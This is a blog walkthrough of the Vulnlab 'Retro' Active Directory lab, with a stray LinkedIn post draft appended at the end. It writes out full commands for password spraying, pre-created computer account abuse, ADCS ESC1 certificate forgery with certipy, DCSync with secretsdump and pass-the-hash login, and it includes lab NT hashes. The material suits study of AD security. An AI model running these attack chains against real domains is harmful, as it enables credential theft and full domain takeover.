---
layout: post
title: Vulnlab - Retro Walkthrough
date: 19-04-2025
categories: [Vulnlab]
tags: [changepasswd, pre2k, ADCS, ESC1, certipy, TGT]
image: "https://assets.vulnlab.com/retro_slide.png"
---

## Introduction

Welcome back to my Active Directory exploitation series from Vulnlab! In the previous post, we tackled `Baby2`, where we explored `ACL abuse` and `GPO misconfigurations` for privilege escalation within a Windows AD environment.

Today, we're diving into the next lab in the series `Retro`.

`Retro` is a solo, junior-level Windows Active Directory machine that introduces new attack paths involving `Pre-created Computer Accounts` and the powerful, often-overlooked `Active Directory Certificate Services (ADCS)`.

These two components are common in enterprise environments, and misconfigurations here can open doors to full domain compromise even without high initial privileges.

> By the end of this lab, you’ll have hands-on experience with:
>- Enumerating and abusing `pre-created machine accounts`
>- Exploiting misconfigured `ADCS` for privilege escalation 
{: .prompt-tip }

### Understanding the Concepts
Before jumping into the exploitation phase, let’s break down the two main concepts this lab focuses on `Pre-Created Computer Accounts` and `Active Directory Certificate Services (ADCS)` in a beginner-friendly way.

**Pre-Created Computer Accounts**
> `Pre-Created Computer Accounts` In Active Directory environments, every computer that joins the domain gets its own account just like users do. Normally, these accounts are created during the domain join process. But sometimes, IT admins pre-create them ahead of time.Why? To control exactly how a machine joins the domain and what permissions it has. Here’s where it gets interesting for attackers, When a computer account is pre-created(if the "*`Assign this computer account as a pre-Windows 2000 computer`*" checkbox is `enabled`)), the computer account is given a default, predictable password, the account name in lowercase. For example, a computer account named `HRLaptop$` would have the password `hrlaptop`. 
{: .prompt-tip }

**Active Directory Certificate Services (ADCS)**
> `Active Directory Certificate Services (ADCS)` is a Windows Server role for issuing and managing `Public Key infrastructure (PKI)` certificates used in secure communication and authentication protocols.
{: .prompt-tip }
> `ADCS` is like a digital ID system in Windows networks. It lets users and devices request certificates (like ID cards) to prove who they are. These certificates are used for things like secure logins, encryption, and communication.But if it’s misconfigured, attackers can trick the system into giving them certificates for privileged users like `Administrator`.That means the attacker could log in as an `Administrator` using just a certificate, completely bypassing normal security checks.
{: .prompt-tip }

>Now that we’ve broken down and understood the key concepts of `Pre-Created Computer Accounts` and `Active Directory Certificate Services (ADCS)`, let’s dive into the practical exploitation steps and see how these misconfigurations can be leveraged in Active Directory environment.
{: .prompt-tip }

### Tools Breakdown
> NetExec(nxc): network execution tool for interacting with various services remotely, supporting protocols like VNC, SSH, WINRM, MSSQL, FTP, LDAP, RDP, WMI, NFS, SMB. It allows for remote code execution and service interaction using valid credentials across different network protocols.
{: .prompt-tip }

> SMBclient: command-line client for accessing shared folders and files over the SMB protocol. It was used to interact with shared folders on the target machine, gather information about the logon script, and later upload a modified version to establish a reverse shell.
{: .prompt-tip }

> BloodHound: is a tool for Active Directory enumeration that maps out attack paths and privilege escalation opportunities in AD environments.
{: .prompt-tip }

> Impacket Changepasswd: is a tool that allows you to change the password of a user or machine account in Active Directory using RPC (Remote Procedure Call).
{: .prompt-tip }

> Certipy:  is a powerful tool used for attacking Active Directory Certificate Services (ADCS). It helps to Discover vulnerable certificate templates, Request certificates for users or machine accounts, Authenticate using those certificates (no password needed!). 
{: .prompt-tip }

> Impacket Secretsdump:  tool from the Impacket suite that is used to dump credentials, hashes, and other sensitive information from Windows machines.
{: .prompt-tip }

> Evil-WinRM: A tool to remotely access Windows machines via WinRM using valid credentials for shell access.
{: .prompt-tip }


## Scanning

```bash
nmap -Pn -T4 -sC -sV -p- --open --min-rate=10000 10.10.88.155 -oN reports/all_tcp.txt
```

```bash
➜  Retro nmap -Pn -T4 -sC -sV -p- --open --min-rate=10000 10.10.88.155 -oN reports/all_tcp.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 19:40 EAT
Nmap scan report for 10.10.88.155 (10.10.88.155)
Host is up (0.18s latency).
Not shown: 65526 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE    VERSION
53/tcp    open  domain     Simple DNS Plus
135/tcp   open  msrpc      Microsoft Windows RPC
139/tcp   open  tcpwrapped
389/tcp   open  tcpwrapped
	| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-04-13T16:26:36
|_Not valid after:  2026-04-13T16:26:36
445/tcp   open  tcpwrapped
593/tcp   open  tcpwrapped
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-04-12T16:35:20
|_Not valid after:  2025-10-12T16:35:20
49681/tcp open  tcpwrapped
49712/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.34 seconds
```

## Enumeration

### SMB

After running an Nmap scan, we identified several ports commonly seen in Active Directory environments. We began our enumeration with `SMB`, which revealed `Guest` access was enabled with an `empty password`. While browsing the available shares, we discovered that the Trainees share was readable.

```powershell
nxc smb 10.10.79.94 -u 'Guest' -p '' --shares
```

![alt text](/assets/screenshots/Retro/1.png)

Inside, we found a file named `Important.txt` a message from the admins stating they had *bundled their accounts into one* because they were tired of constantly resetting forgotten passwords. This strongly `hinted at a weak or default credential setup`, possibly using usernames like `trainee` or `trainees` with passwords matching the usernames (e.g., `trainee:trainee`).

![alt text](/assets/screenshots/Retro/2.png)

To confirm our suspicion of weak credentials, we used `Kerbrute` for user enumeration This revealed a valid user account `trainee`.

```powershell
kerbrute userenum  -d retro.vl  --dc 10.10.79.94  -t 100 wordlists/userslist.txt
```

![alt text](/assets/screenshots/Retro/3.png)

We then tested common password patterns using `NetExec (nxc)`, where we assumed the `username` might be `used as` the `password`. And it worked! 

```powershell
nxc smb 10.10.79.94 -u loots/users.txt -p loots/users.txt  --no-bruteforce --continue-on-success
```

![alt text](/assets/screenshots/Retro/4.png)

>With valid credentials in hand, the next typical step in Active Directory enumeration is to try pulling a list of all domain users and testing for common attacks like `AS-REP Roasting` (for users not requiring pre-authentication) and `Kerberoasting` (for service accounts with `SPNs`).However, in this lab, those techniques didn’t yield any results, so we’ll be diving deeper into these attacks in upcoming labs where they’re more relevant.
{: .prompt-tip }

Users

```powershell
nxc smb 10.10.79.94 -u trainee -p trainee --users
```

![alt text](/assets/screenshots/Retro/5.png)

Kerberoasting

```powershell
GetUserSPNs.py -dc-ip 192.168.1.241  retro.vl/trainee:trainee  -request
```

AS-REP Roasting

```powershell
GetNPUsers.py retro.vl/trainee:trainee -usersfile loots/users.txt  -dc-ip 10.10.79.94
```

![alt text](/assets/screenshots/Retro/6.png)

Enumerating Shares again
Now that we had valid credentials, we went back to enumerating `SMB` shares a common and essential step in Active Directory assessments. In AD environments, access control varies between accounts, so it’s important to repeat enumeration whenever new credentials are discovered. You might uncover different shares, permissions, or hidden clues depending on the user.This time, using the `trainee` credentials, we were able to read from a previously inaccessible share called `Notes`. 

```powershell
nxc smb 10.10.79.94 -u trainee -p trainee --shares
```

![alt text](/assets/screenshots/Retro/7.png)

Inside, we found a document hinting at the use of `pre-created computer accounts` a clue that would guide our next move.

```powershell
smbclient -U trainee //10.10.79.94/Notes
```

![alt text](/assets/screenshots/Retro/8.png)

Abusing Weak AD Permision Pre2K Compatibility

To move forward, we took advantage of a common Active Directory misconfiguration related to `Pre-Windows 2000 Compatibility`. We used `netexec` to identify a `pre-created computer accounts` that could be abused.

Using netexec

```powershell
nxc ldap 10.10.79.94 -u trainee -p trainee -M pre2k
```

![alt text](/assets/screenshots/Retro/9.png)

This helped us obtain a `TGT (Ticket Granting Ticket)` for the computer account. We could also authenticate using the `computer name `as the `password` (all lowercase). To use this `TGT`, we simply exported the ticket using:
```powershell
export KRB5CCNAME=loots/tickets/banking.ccache
```

![alt text](/assets/screenshots/Retro/10.png)

> A `TGT` is like a "`hall pass`" in Active Directory. When you log in, the `Domain Controller` gives you a `TGT` that proves your identity. You can then use it to `request` access to other services (like `SMB`, `LDAP`, etc.) `without re-entering your password each time`. It's part of the `Kerberos authentication` process.
{: .prompt-tip }

After discovering the pre-created computer account `BANKING$ `and obtaining a valid `TGT`, we wanted to confirm whether we could use it to authenticate. We first tested the `TGT` we extracted earlier using `netexec`, This confirmed that we had valid access using the ticket.
```powershell
nxc smb 10.10.79.94 --use-kcache
```

![alt text](/assets/screenshots/Retro/11.png)

Trying to log in using the default password (computer name in lowercase) failed because it required the password to be changed.

```powershell
nxc smb 10.10.79.94 -u "BANKING$" -p banking
```

![alt text](/assets/screenshots/Retro/12.png)

To fix this, we used `changepasswd.py` from `Impacket` to set a new password.

```powershell
changepasswd.py retro.vl/BANKING\$@10.10.79.94 -newpass 'Password123!' -p rpc-samr
```

![alt text](/assets/screenshots/Retro/13.png)

We then re-authenticated with the updated password, and it worked.

```powershell
nxc smb 10.10.79.94 -u "BANKING$" -p 'Password123!'
```

![alt text](/assets/screenshots/Retro/14.png)

With valid access confirmed using both TGT and password, we’re now ready to move to the next stage in the attack chain. We'll be switching between using the `TGT` and the `password`. This helps demonstrate how both methods work in real scenarios.

### ADCS Enumeration
we continued enumeration using `netexec` to check if `Active Directory Certificate Services (ADCS)` was deployed in the environment and the output revealed the presence of a certificate authority named `retro-DC-CA`.

Using `nextexec`

```powershell
nxc ldap 10.10.79.94 --use-kcache -M adcs
```

![alt text](/assets/screenshots/Retro/15.png)

Using `Certipy`

```powershell
certipy find -u 'BANKING$' -p 'Password123!' -dc-ip "10.10.79.94" -debug
```

![alt text](/assets/screenshots/Retro/16.png)

**Find Vulnerable Templates**

After identifying that `ADCS` was running (`retro-DC-CA`), we moved forward to check for vulnerable certificate templates these are configurations within `ADCS` that, if misconfigured, can allow low-privileged users (or even computer accounts) to request certificates impersonating privileged accounts (like `Domain Admins`).

**What Are Certificate Templates?**
>In a Windows Active Directory Certificate Services (ADCS) environment, certificate templates are like blueprints used to create digital certificates.Think of a certificate template like a form you fill out at the bank — it already has predefined fields and rules. Depending on how the form is designed, some people may be allowed to fill it out, others not.
{: .prompt-tip }

This checks for templates that are known to be vulnerable like (Allow low-privileged users or machine accounts to request certificates, Allow client authentication, Don't require manager approval or certificate request signing).

```powershell
certipy find -u 'BANKING$' -p 'Password123!' -dc-ip "10.10.79.94" -stdout -vulnerable
```

![alt text](/assets/screenshots/Retro/17.png)

![alt text](/assets/screenshots/Retro/18.png)

we discovered that one of the templates was vulnerable to `ESC1` Escalation.
**What is `ESC1`?**
> Imagine you're trying to prove who you are online, and one way to do that is by showing a certificate — like a digital ID card. Normally, this certificate is tied to a specific user (like you) and confirms that you're who you say you are.Now, `ESC1` is a flaw in how certain certificates are issued. It allows someone to trick the system into giving them a certificate for another user (like a Domain Admin) instead of themselves, even if they don't have the right to do that.
{: .prompt-tip }

>In a vulnerable setup, an attacker with low-level access (like a regular user) could use this flaw to request a certificate that makes them look like a Domain Admin or another important user. They could then use this certificate to login as that higher-privileged user and gain unauthorized access.
{: .prompt-tip }

## Initial access

### Exploting ESC1

By default, the certificate request using this vulnerable template returns a `.pfx` file for the `DC$` account. This certificate can then be used to perform a `DCSync` attack against the domain controller itself allowing us to extract sensitive credentials like password hashes.

```powershell
certipy req -u 'BANKING$' -p 'Password123!' -dc-ip '10.10.79.94' -ca 'retro-DC-CA' -template 'RetroClients' -dns 'DC.retro.vl' -key-size 4096 -debug
```

![alt text](/assets/screenshots/Retro/19.png)

```powershell
certipy auth -pfx dc.pfx -domain retro.vl
```

This give use `NTLM` hash for `DC$`

![alt text](/assets/screenshots/Retro/20.png)

To confirm it works, we can use `netexec` with the `NT hash` obtained after authentication.

```powershell
nxc smb 10.10.79.94 -u 'DC$' -H 532f3be569a64881ec82f1cc875059e3
```

![alt text](/assets/screenshots/Retro/21.png)

Alternatively, as many attackers prefer, we can also manually specify a different user, such as `administrator`, in the request. This way, we directly obtain a certificate to authenticate as a `Domain Admin`.

```powershell
certipy req -u 'BANKING$' -p 'Password123!' -dc-ip '10.10.79.94' -ca 'retro-DC-CA' -template 'RetroClients' -dns 'DC.retro.vl' -key-size 4096 -upn 'administrator@retro.vl'
```

then

```powershell
certipy auth -pfx administrator_dc.pfx -domain retro.vl
```
![alt text](/assets/screenshots/Retro/24.png)

## Privilege Escalation

Once we had a valid certificate and successfully authenticated as the `DC$` (`Domain Controller machine account`), we had the ability to perform `DCSync` or extract secrets from the domain controller using tools like `secretsdump.py`.

This step allows us to dump password hashes of all users in the domain, including privileged accounts like `krbtgt` and `Administrator`, which is a critical part of post-exploitation.

### Dumping secrets

```powershell
secretsdump.py retro.vl/'DC$'@10.10.79.94 -hashes aad3b435b51404eeaad3b435b51404ee:532f3be569a64881ec82f1cc875059e3
```

![alt text](/assets/screenshots/Retro/23.png)

This gave us a full dump of user credentials, including password hashes. These can be cracked offline or used in pass-the-hash attacks to impersonate other users and move laterally within the network.

```powershell
evil-winrm -i retro.vl -u Administrator -H 252fac7066d93dd009d4fd2cd0368389
```

## Wrap-Up
In this lab, we started by identifying `pre-created computer accounts` in the domain. Using `NetExec`, we authenticated with one of them (`BANKING$`) and successfully obtained a `Ticket Granting Ticket (TGT)`. This gave us two useful access methods via `TGT` and the machine password helping us understand how both can be leveraged for lateral movement and enumeration.

We then discovered that `Active Directory Certificate Services (ADCS)` was deployed in the environment. Using `Certipy`, we found a certificate template vulnerable to `ESC1`. This enabled us to request a certificate as another user such as the Domain Controller account (`DC$`) or even the `Administrator`.

With the generated `.pfx` certificate, we authenticated as a privileged user and performed a `DCSync` attack using `Impacket's secretsdump`, successfully dumping password hashes from the `Domain Controller`.

This lab demonstrated how seemingly low-privileged accounts like machine accounts can be escalated through ADCS misconfigurations, leading to full domain compromise.

## References

[NetExec Cheatsheet](https://seriotonctf.github.io/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/)

[Pre-Windows 2000 computers](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers)

[Diving into Pre-Created Computer Accounts](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts)

[Abusing AD Weak Permission Pre2K Compatibility](https://www.hackingarticles.in/abusing-ad-weak-permission-pre2k-compatibility/)

[Certificate templates](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates)

[Certipy](https://github.com/ly4k/Certipy)





now lets share to linkedin
this was my last post
I’m kicking off a series on Active Directory exploitation, starting with standalone machines, moving through chains, and diving into Red Team labs from Vulnlab. I have already posted walkthroughs for the first two machines, Baby and Baby2. Check them out on my blog and stay tuned for more!

Check them out on my blog: https://cyb4x.github.io/

hashtag#ActiveDirectory hashtag#RedTeam hashtag#Vulnlab hashtag#CyberSecurity hashtag#Pentesting hashtag#WindowsSec